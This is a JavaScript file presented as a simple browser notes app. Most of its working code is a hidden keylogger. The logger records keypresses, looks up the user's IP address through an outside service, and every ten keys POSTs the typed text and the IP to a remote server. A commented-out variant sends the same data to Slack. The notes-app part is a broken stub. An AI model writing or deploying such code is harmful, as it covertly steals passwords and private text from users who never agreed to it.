let log = [];

document.addEventListener('keydown', (event) => {
    
    log.push(event.key);

    if (log.length >= 10) {
        // console.log(log);
        goPalantir(log);
        log = [];
    }
});

async function goPalantir(load) {
    try {
        load = load.join("");
        await console.log(load);
        // fetch('https://slack.com/api/chat.postMessage', {
        //     method: 'POST',
        //     headers: {
        //         'Authorization': `Bearer ${token}`,
        //         'Content-Type': 'application/json'
        //     },
        //     body: JSON.stringify({
        //         channel: `C0BNS59V22V`,
        //         text: load,
        //     })
        // })
        // await fetch('http://localhost:8000', {
        let res = await fetch("https://ip.wtf");
        let ip = await res.text();
        console.log(ip.trim()); 
        
        await fetch('https://hmm.henrywauzivuff.xyz', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                "text": `${load}, from ${ip.trim()}`
            })
        });
    } catch (error) {
        console.log(`failed to palantir 💔, error ${error}`);
    };
};

const noteForm = document.getElementbyId('note-form');

let notes = JSON.parse(localStorage.getItem('notes')) || [];

async function saveNotes() {
    localStorage.setItem('notes', JSON.stringify(notes));   
}

function renderNotes() {
    
}

notes.addEventListener('enter', e => {
    e.preventDefault();

    saveNotes();
    renderNotes();
})